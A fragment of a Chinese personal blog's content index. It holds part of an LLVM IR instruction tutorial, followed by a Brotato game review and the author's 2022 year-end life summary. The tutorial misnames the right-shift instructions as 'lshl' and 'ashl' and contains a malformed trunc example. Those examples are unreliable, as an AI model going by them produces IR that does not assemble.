class="headerlink" title="shl 指令"></a>shl 指令</h3><ul><li><strong>整数</strong>左移指令，对应 C&#x2F;C++ 中的“&lt;&lt;”操作符，类似x86汇编中的 shl 指令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = shl &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = shl i32 4, %var; yields i32:result 4 &lt;&lt; %var</span><br><span class="line">&lt;result&gt; = shl i32 4, 2; yields i32:result 16</span><br><span class="line">&lt;result&gt; = shl i32 1, 10; yields i32:result 1024</span><br><span class="line">&lt;result&gt; = shl i32 1, 32; undefined</span><br><span class="line">&lt;result&gt; = shl &lt;2 x i32&gt; &lt; i32 1, i32 1&gt;, &lt; i32 1, i32 2&gt;; yields: result = &lt;2 x i32&gt; &lt; i32 2, i32 4&gt;</span><br></pre></td></tr></table></figure><h3 id="lshl-指令"><a href="#lshl-指令" class="headerlink" title="lshl 指令"></a>lshl 指令</h3><ul><li>整数<strong>逻辑右移</strong>指令，对应 C&#x2F;C++ 中的“&gt;&gt;”操作符，右移指定位数后在左侧补0</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = lshl &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = lshl i32 4, 1; yields i32:result 2</span><br><span class="line">&lt;result&gt; = lshl i32 4, 2; yields i32:result 1</span><br><span class="line">&lt;result&gt; = lshl i8 4, 3; yields i8:result 0</span><br><span class="line">&lt;result&gt; = lshl i8 -2, 1; yields i8:result 0x7F</span><br><span class="line">&lt;result&gt; = lshl i32 1, 32; underfined</span><br><span class="line">&lt;result&gt; = lshl &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 2&gt;; yields: result = &lt;2 x i32&gt; &lt; i32 0x7FFFFFFF, i32 1&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ashr-指令"><a href="#ashr-指令" class="headerlink" title="ashr 指令"></a>ashr 指令</h3><ul><li>整数<strong>算数右移</strong>指令，右移指定位数后在左侧补<strong>符号位</strong>（负数的符号位为1，正数的符号位为0）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = ashl &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = ashl i32 4, 1; yields i32:result 2</span><br><span class="line">&lt;result&gt; = ashl i32 4, 2; yields i32:result 1</span><br><span class="line">&lt;result&gt; = ashl i8 4, 3; yields i8:result 0</span><br><span class="line">&lt;result&gt; = ashl i8 -2, 1; yields i8:result -1</span><br><span class="line">&lt;result&gt; = ashl i32 1, 32; underfined</span><br><span class="line">&lt;result&gt; = ashl &lt;2 x i32&gt; &lt; i32 -2, i32 4&gt;, &lt; i32 1, i32 3&gt;; yields: result = &lt;2 x i32&gt; &lt; i32 -1, i32 0&gt;</span><br></pre></td></tr></table></figure><h3 id="and-指令"><a href="#and-指令" class="headerlink" title="and 指令"></a>and 指令</h3><ul><li><strong>整数</strong>按位与运算指令，对应 C&#x2F;C++ 中的“&amp;”操作符。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = and &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = and i32 4, %var; yields i32:result = 4 &amp; %var</span><br><span class="line">&lt;result&gt; = and i32 15, 40; yields i32:result = 8</span><br><span class="line">&lt;result&gt; = and i32 4, 8; yields i32:result = 0</span><br></pre></td></tr></table></figure><h3 id="or-指令"><a href="#or-指令" class="headerlink" title="or 指令"></a>or 指令</h3><ul><li><strong>整数</strong>按位或运算指令，对应 C&#x2F;C++ 中的“|”操作符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = or &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = or i32 4, %var; yields i32:result = 4 | %var</span><br><span class="line">&lt;result&gt; = or i32 15, 40; yields i32:result = 47</span><br><span class="line">&lt;result&gt; = or i32 4, 8; yields i32:result = 12</span><br></pre></td></tr></table></figure><h3 id="xor-指令"><a href="#xor-指令" class="headerlink" title="xor 指令"></a>xor 指令</h3><ul><li><strong>整数</strong>按位异或运算指令，对应 C&#x2F;C++ 中的“^”操作符</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = xor &lt;type&gt; &lt;op1&gt;, &lt;op2&gt;; yields type:result</span><br><span class="line">例：</span><br><span class="line">&lt;result&gt; = xor i32 4, %var; yields i32:result = 4 ^ %var</span><br><span class="line">&lt;result&gt; = xor i32 15, 40; yields i32:result = 39</span><br><span class="line">&lt;result&gt; = xor i32 4, 8; yields i32:result = 12</span><br><span class="line">&lt;result&gt; = xor i32 %V, -1; yields i32:result = ~%V</span><br></pre></td></tr></table></figure><h2 id="内存访问和寻址操作-Memory-Access-and-Addressing-Operations"><a href="#内存访问和寻址操作-Memory-Access-and-Addressing-Operations" class="headerlink" title="内存访问和寻址操作 Memory Access and Addressing Operations"></a>内存访问和寻址操作 Memory Access and Addressing Operations</h2><h3 id="静态单赋值"><a href="#静态单赋值" class="headerlink" title="静态单赋值"></a>静态单赋值</h3><ul><li>在编译器设计中，静态单赋值（Static Single Assignment, SSA），是 IR 的一种属性</li><li>SSA 的特点是：<strong>在程序中一个变量仅能有一条赋值语句</strong></li><li>LLVM IR 正是基于静态单赋值原则设计的</li></ul><p>在下面这个程序流程图中，变量 x, y, w 都被赋值了两次，不满足 SSA</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207034908128.png" alt="image-20230207034908128"></p><p>在下面这个程序流程图中，所有变量都只被赋值了一次，满足 SSA</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207034927020.png" alt="image-20230207034927020"></p><h3 id="由-SSA-引起的问题"><a href="#由-SSA-引起的问题" class="headerlink" title="由 SSA 引起的问题"></a>由 SSA 引起的问题</h3><p>假设 C++ 也是基于静态单赋值原则的（即一个变量只能被赋值一次），要怎样修改这个 for 循环，使其符合 SSA 原则？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i ++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello, %d\n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是一种实现方式，也是 LLVM IR 采取的实现方式。在LLVM IR 中也有类似 malloc 和 指针操作 的指令</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *i = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span>(*i = <span class="number">0</span>; *i &lt; <span class="number">100</span>; (*i) ++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Hello, %d\n&quot;</span>, *i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="alloca-指令"><a href="#alloca-指令" class="headerlink" title="alloca 指令"></a>alloca 指令</h3><ul><li>内存分配指令，在<strong>栈</strong>中分配一块空间并获得指向该空间的指针，类似于 C&#x2F;C++ 中的 malloc 函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = alloca &lt;type&gt; [, &lt;type&gt; &lt;NumElements&gt;] [, align &lt;alignment&gt;]; 分配sizeof(type)*NumElements 字节的内存，分配地址与 alignment 对齐</span><br><span class="line">例：</span><br><span class="line">%ptr = alloca i32; 分配 4 字节的内存并返回 i32 类型的指针</span><br><span class="line">%ptr = alloca i32, i32 4; 分配 4*4 字节的内存并返回 i32 类型的指针</span><br><span class="line">%ptr = alloca i32, i32 4, align 1024; 分配 4*4 字节的内存并返回 i32 类型的指针，分配的地址与 1024 对齐</span><br><span class="line">%ptr = alloca i32, align 1024; 分配 4 字节的内存并返回 i32 类型的指针，分配的地址与 1024 对齐</span><br></pre></td></tr></table></figure><h3 id="store-指令"><a href="#store-指令" class="headerlink" title="store 指令"></a>store 指令</h3><ul><li>内存存储指令，向指针指向的内存中存储数据，类似于 C&#x2F;C++ 中的指针解引用后的赋值操作</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">store &lt;type&gt; &lt;value&gt;, &lt;type&gt;* &lt;pointer&gt;; 向特定类型指针指向的内存存储相同类型的数据</span><br><span class="line">例：</span><br><span class="line">%ptr = alloca i32; yields i32*:ptr</span><br><span class="line">store i32 3, i32* %ptr; yields void</span><br></pre></td></tr></table></figure><h3 id="load-指令"><a href="#load-指令" class="headerlink" title="load 指令"></a>load 指令</h3><ul><li>内存读取指令，从指针指向的内存中读取数据，类似于 C&#x2F;C++ 中的指针解引用操作</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = load &lt;type&gt;, &lt;type&gt;* &lt;pointer&gt;; 从特定类型指针指向的内存中读取特定类型的数据</span><br><span class="line">例：</span><br><span class="line">%ptr = alloca i32; yields i32*:ptr</span><br><span class="line">store i32 3, i32* %ptr; yields void</span><br><span class="line">%val = load i32, i32* %ptr; yields i32:val = i32 3</span><br></pre></td></tr></table></figure><h2 id="类型转换操作-Conversion-Operations"><a href="#类型转换操作-Conversion-Operations" class="headerlink" title="类型转换操作 Conversion Operations"></a>类型转换操作 Conversion Operations</h2><h3 id="trunc-to-指令"><a href="#trunc-to-指令" class="headerlink" title="trunc .. to 指令"></a>trunc .. to 指令</h3><ul><li>u截断指令，将一种类型的变量截断为另一种类型的变量。对应 C&#x2F;C++ 中大类型向小类型的强制转换（比如 long 强转 int）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = trunc &lt;type1&gt; &lt;value&gt; to &lt;type2&gt;; 将 type1 类型的变量截断为 type2 类型的变量</span><br><span class="line">例：</span><br><span class="line">%X = trunc i32 257 to i8; yields i8:1</span><br><span class="line">%Y = trunc i32 123 to i1; yields i1:true</span><br><span class="line">%Z = trunc i32 122 to i1; yields i1:false</span><br><span class="line">%W = trunc i32 &lt;2 x i16&gt; &lt;i16 8, i16 7&gt; to &lt;2 x i8&gt;; yields &lt;i8 8, i8 7&gt;</span><br></pre></td></tr></table></figure><h3 id="zext-to-指令"><a href="#zext-to-指令" class="headerlink" title="zext .. to 指令"></a>zext .. to 指令</h3><ul><li>零拓展（Zero Extend）指令，将一种类型的变量拓展为另一种类型的变量，高位补0。对应 C&#x2F;C++ 中小类型向大类型的强制转换（比如 int 强转 long）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = zext &lt;type1&gt; &lt;value&gt; to &lt;type2&gt;; 将 type1 类型的变量拓展为 type2 类型的变量</span><br><span class="line">例：</span><br><span class="line">%X = zext i32 257 to i64; yields i64:257</span><br><span class="line">%Y = zext i1 true to i32; yields i32:1</span><br><span class="line">%Z = zext &lt;2 x i16&gt; &lt;i16 8, i16 7&gt; to &lt;2 x i32&gt;; yields &lt;i32 8, i32 7&gt;</span><br></pre></td></tr></table></figure><h3 id="sext-to-指令"><a href="#sext-to-指令" class="headerlink" title="sext .. to 指令"></a>sext .. to 指令</h3><ul><li>符号位拓展（Sign Extend）指令，通过复制符号位（最高位）将一种类型的变量拓展为另一种类型的变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = sext &lt;type1&gt; &lt;value&gt; to &lt;type2&gt;; 将 type1 类型的变量拓展为 type2 类型的变量</span><br><span class="line">例：</span><br><span class="line">%X = sext i8 -1 to i16; yields i16:-1</span><br><span class="line">%Y = sext i1 true to i32; yields i32:-1</span><br><span class="line">%Z = sext &lt;2 x i16&gt; &lt;i16 8, i16 7&gt; to &lt;2 x i32&gt;; yields &lt;i32 8, i32 7&gt;</span><br></pre></td></tr></table></figure><h2 id="其他操作-Other-Operations"><a href="#其他操作-Other-Operations" class="headerlink" title="其他操作 Other Operations"></a>其他操作 Other Operations</h2><h3 id="phi-指令"><a href="#phi-指令" class="headerlink" title="phi 指令"></a>phi 指令</h3><p>由静态单赋值引起的问题：在最后一个基本块中，我们怎么知道应该使用 y1 变量还是y2 变量呢？</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207034927020.png" alt="image-20230207034927020"></p><p>u通过引入 Φ 函数来解决这个问题，Φ 函数的值由前驱块决定，这里的 Φ 函数对应 LLVM IR 中的 phi 指令：</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230207041246011.png" alt="image-20230207041246011"></p><ul><li>phi 指令可以看做是为了解决 SSA 一个变量只能被赋值一次而引起的问题衍生出的指令</li><li>phi 指令的计算结果由 phi 指令所在的基本块的 <strong>前驱块</strong> 确定</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = phi &lt;type&gt; [ &lt;val0&gt;, &lt;label0&gt;], ... ; 如果前驱块为 label0，则 result=val0 ...</span><br><span class="line">例：实现 for 循环</span><br><span class="line">Loop:; Infinite loop that counts from 0 on up...</span><br><span class="line">%indvar = phi i32 [ 0, %LoopHeader ], [ %nextindvar, %Loop ]</span><br><span class="line">%nextindvar = add i32 %indvar, 1</span><br><span class="line">br label %Loop</span><br></pre></td></tr></table></figure><h3 id="select-指令"><a href="#select-指令" class="headerlink" title="select 指令"></a>select 指令</h3><ul><li>select 指令类似于 C&#x2F;C++ 中的<strong>三元运算符</strong>”… ? … : …”</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = select i1 &lt;cond&gt;, &lt;type&gt; &lt;val1&gt;, &lt;type&gt; &lt;val2&gt;;如果条件 cond 成立，result=val1，否则 result=val2</span><br><span class="line">例：</span><br><span class="line">%X = select i1 true, i8 17, i8 42 ; yields i8:17</span><br></pre></td></tr></table></figure><h3 id="call-指令"><a href="#call-指令" class="headerlink" title="call 指令"></a>call 指令</h3><ul><li>call 指令用来调用某个函数，对应 C&#x2F;C++ 中的函数调用，与x86汇编中的 call 指令类似</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;result&gt; = call &lt;type&gt;|&lt;fntype&gt; &lt;fnptrval&gt;(&lt;function args&gt;) ;调用函数</span><br><span class="line">例：</span><br><span class="line">%retval = call i32 @test(i32 %argc) ; 调用 test 函数，参数为 i32 类型，返回值为 i32 类型</span><br><span class="line">call i32 (i8*, ...)* @printf(i8* %msg, i32 12, i8 42); 调用 printf 函数，参数可变</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码混淆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《孤独摇滚！》：可爱温柔引人共鸣</title>
      <link href="/posts/42707/"/>
      <url>/posts/42707/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《双人成行》游戏测评</title>
      <link href="/posts/51999/"/>
      <url>/posts/51999/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《LoveChoice 拣爱》游戏测评</title>
      <link href="/posts/26382/"/>
      <url>/posts/26382/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>《Brotato》游戏测评</title>
      <link href="/posts/59327/"/>
      <url>/posts/59327/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>非常上头的一款小游戏，46 小时全成就通关，总结记录一下</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230106153903860.png" alt="image-20230106153903860"></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>看宫本狗雨在直播间玩了，非常有意思，立马 22 块买了开始玩。果不其然非常上头，十分杀时间。</p><h2 id="游戏性"><a href="#游戏性" class="headerlink" title="游戏性"></a>游戏性</h2><p>轻肉鸽莱克游戏，主角是个b土豆（我一开始是真没看出来），打的是外星人。难度比较适中，也比较吃运气，算得上是一个休闲小游戏。</p><h3 id="玩法"><a href="#玩法" class="headerlink" title="玩法"></a>玩法</h3><p>可以选择不同的主角，每一个主角有特定的技能效果，普遍可以拿 6 个武器。</p><p>每一局一共 20 关，每一关杀怪会掉落钱，捡钱可以加经验值，升级可以加属性，没捡到的钱会在当前关卡结束时自动收集，每过一关可以进入商店买武器和道具。</p><p><strong>核心玩法就是道具、武器和角色技能之间的配合</strong>，因为大部分道具不是单纯的增益属性，而是增加某属性的同时削弱另一个属性，比如<strong>增加 6% 伤害，减少 8 范围</strong>，玩家需要有取舍的获取自己需要的属性和武器。</p><p>难度分为危险 0 - 5，六个难度，每过一个难度等级会解锁一个新角色，在对局中达到某些特定属性，也会解锁新角色。</p><p>每个角色的技能都不同，所以都非常有特点，导致玩法和流派也千奇百怪，再加上刷新的道具武器不同，运气好坏，使得这个游戏很难玩腻，每一局都很有新鲜感。</p><h3 id="美术和音乐"><a href="#美术和音乐" class="headerlink" title="美术和音乐"></a>美术和音乐</h3><p>美术就这样，小成本游戏，但还是有点精致的。</p><p>音乐我玩着玩着有点听腻了，就全部关掉了。</p><h3 id="剧情"><a href="#剧情" class="headerlink" title="剧情"></a>剧情</h3><p>就是一土豆降落外星球打外星人的故事，毫无剧情可言，刷刷刷就完事了。</p><h2 id="综合评价"><a href="#综合评价" class="headerlink" title="综合评价"></a>综合评价</h2><p>非常上头的一款小游戏，难度不大，也比较有趣，耐玩性较高，还比较解压。</p>]]></content>
      
      
      <categories>
          
          <category> 游戏测评 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 游戏测评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年终总结</title>
      <link href="/posts/57980/"/>
      <url>/posts/57980/</url>
      
        <content type="html"><![CDATA[<blockquote><p>写在前面</p><p>憨鸠鸠又一日，柒懵懵又一年。</p></blockquote><blockquote><p>2023.1.6 下午开<del>写</del>摆</p><p>1.11 更新</p></blockquote><h1 id="来日"><a href="#来日" class="headerlink" title="来日"></a>来日</h1><ul><li><input checked="" disabled="" type="checkbox"> <strong>好好吃饭，好好上课，好好睡觉</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>克服拖延症</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>拿下一台 macOS</strong></li><li><input disabled="" type="checkbox"> <strong>空闲时间继续学二进制，尝试复现一些🍎的漏洞</strong></li><li><input disabled="" type="checkbox"> <strong>过大四体测</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>装修好自己的房间</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>养成一些良好的习惯，比如早睡早起、跑步&#x2F;散步&#x2F;快走</strong></li><li><input checked="" disabled="" type="checkbox"> <strong>身体恢复正常</strong></li></ul><blockquote><p>今年唯一可惜的可能就是没有考研上岸吧。</p><p>这一年过的很平淡，大四老东西从社团中慢慢脱身，变成了一个普通的大学生卷入考研的浪潮。得益于规律的考研生活，以前的鬼见愁作息也调整过来了，一年下来也没生什么病，最严重的一场大病就是考研前阳了，真是各种意义上的严重。</p><p>上半年拿了个 3k 的企业奖学金，自己填了点买了个二手的 mac mini，年末因为实在受不了一加 7p 的碎屏和烧屏，收了个二手的 iPhone13 pro，再加上去年买的底配 iPad，也算磕磕绊绊凑齐了全家桶，被迫投入了苹果生态的怀抱。比较不满意的是没能坚持挤出时间来学二进制，mac mini 没有实现我买它的初衷。</p><p>今年家里面全部重新装修，我的房间全部大改，我从初中开始住校到今年大四，不论是在家还是在学校，我都是睡的2*1.5的上下铺，于是在我的强烈抗议下，老爸老妈丢掉了我房间里面的上下铺，给我买了个大床，非常舒服我只能说。</p><p>为什么大四体测没过呢，当然是因为这个 b 疫情，导致整个大四上都没安排到体测。</p></blockquote><h1 id="方长"><a href="#方长" class="headerlink" title="方长"></a>方长</h1><ul><li><input disabled="" type="checkbox"> <strong>好好吃饭，好好学习，好好睡觉</strong></li><li><input disabled="" type="checkbox"> <strong>考研上岸</strong></li><li><input disabled="" type="checkbox"> <strong>顺利毕业</strong></li><li><input disabled="" type="checkbox"> <strong>重拾吉他</strong></li><li><input disabled="" type="checkbox"> <strong>入门调酒</strong></li><li><input disabled="" type="checkbox"> <strong>每个月攒几百块钱，不要月光</strong></li></ul><h1 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h1><p>因为疫情没什么年味，也没去哪里拜年。比较有意思的事是跟高中的老同学们出来聚了几次，一起爬了西山公园，买了馒头喂了鱼，感受了一下桂林的慢节奏老年养生生活，还一起去吃了烤肉，有说有笑非常开心。</p><p>看着公园里晨练的、喂鱼的、下棋的、唠嗑的、散步跑步的老人，我想了很久关于未来的规划，想来想去也没想出个所以然，以前大一刚进来的时候非常想去上班，到大三又变成非常不想去上班，感觉每个阶段会有每个阶段的想法，这个阶段里经历的所有事情都会影响自己未来的看法，所以还是要再努力一点，提升自己的实力，给未来的自己在人生的道路上多一点选择空间。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112030233712.png" alt="老友聚餐"></p><h1 id="大三下"><a href="#大三下" class="headerlink" title="大三下"></a>大三下</h1><h2 id="焕然一新"><a href="#焕然一新" class="headerlink" title="焕然一新"></a>焕然一新</h2><p>回到学校以后正值多雨潮湿的春季，扫地僧学长搞了个帐篷回来，非常温馨，十分舒适。</p><p>协会这张床垫陪我度过了数不清多少个奋斗的、失眠的、摆烂的夜晚，大一大二自己一直很独很翘，把社团当家，逃避处理宿舍关系加上阴间一样的作息让我在跟这张床垫做了两年的伴，大三有机会换到三院的宿舍，认识了家人一样的舍友，我才慢慢的走出这片属于我自己的小天地。</p><p>不奢求床垫的本体能够代代相传，但是希望守夜人精神能够传承下去。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112030311871.png" alt="温馨"></p><h2 id="繁花似锦"><a href="#繁花似锦" class="headerlink" title="繁花似锦"></a>繁花似锦</h2><p>不知道是不是以前不太关注校园，感觉今年的花开的格外好看，配上桂电四面环山的地理位置和春季多雾的天气，就非常的诗情画意，很有感觉，用美不胜收来形容一点也不为过。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220410_130437.jpg" alt="花"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220413_075156.jpg" alt="楼下的花"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220413_090002.jpg" alt="好看"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220413_090646.jpg" alt="爱心"></p><h2 id="爬叠彩山"><a href="#爬叠彩山" class="headerlink" title="爬叠彩山"></a>爬叠彩山</h2><p>劳动节的时候跟研友去爬了叠彩山，有点累，但是登高望远还是很能解压的。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112031508314.png" alt="叠彩山"></p><h2 id="孤独第四级"><a href="#孤独第四级" class="headerlink" title="孤独第四级"></a>孤独第四级</h2><p>劳动节的尾巴，想起很久没去电影院看电影了，自己一个人跑去看了《我是真的讨厌异地恋》，买的是最后一排。</p><p>剧情不太记得清了，但是还是希望自己未来能有谈异地恋的勇气和终结异地恋的能力。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112032337764.png" alt="异地恋"></p><h2 id="奖学金-好学长-x3D-x3D-Mac"><a href="#奖学金-好学长-x3D-x3D-Mac" class="headerlink" title="奖学金 + 好学长 &#x3D;&#x3D; Mac"></a>奖学金 + 好学长 &#x3D;&#x3D; Mac</h2><p>得益于学校奖学金跟体育挂钩的政策，导致我四年优秀的学分绩没发挥出任何作用。本以为就此跟奖学金再无缘分，跟学院合作的企业来弄了个不需要看体育&#x2F;体测成绩的奖学金，稳稳拿下。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112111621787.png" alt="3k"></p><p>随后跟我的摇钱焕借了点，拼拼凑凑，乞乞丐丐的在闲鱼谈下了一台 99新的，在保半年的，16g 运行内存的，512g 存储内存的 Mac mini，迈出了第零步，只可惜今年没有太多时间用它来学习安全技术，23 年一定要派上用场，回归买它的初心。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112025457711.png" alt="mac mini"></p><p>最后特别感谢我的扫地僧师傅，这三年来在学习、生活和经济上给予了我莫大的帮助，每一次都是雪中送碳，饿时送饭，在我迷茫时会给我指点迷津，希望他未来顺风顺水，爱情事业双丰收。</p><h2 id="拼积木"><a href="#拼积木" class="headerlink" title="拼积木"></a>拼积木</h2><p>心血来潮买了个积木回来拼，从分类到拼装，两口气拼了大概 13 个小时。想着磨练了一下自己的定力，提高一下自己的专注力，不过也可能是拼积木这件事比较让人着迷，一开始拼就想一次性拼完。</p><p>拼完以后看着成品真的是成就感满满，今后有机会再买点有意思的积木回来拼。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220622_205434.jpg" alt="分类"></p><p>塞了个戒指进去，不知道当时脑子抽什么风，觉得这样做很浪漫。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230112112611712.png" alt="戒指"></p><p>成品非常好看，摆在桌上十分有排面。</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220624_212120.jpg" alt="成品1"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/IMG_20220624_212136.jpg" alt="成品2"></p><h1 id="暑假"><a href="#暑假" class="headerlink" title="暑假"></a>暑假</h1><p>暑假老老实实在学校复习考研，没有什么印象深刻的事情。</p><h1 id="大四上"><a href="#大四上" class="headerlink" title="大四上"></a>大四上</h1><h2 id="招新"><a href="#招新" class="headerlink" 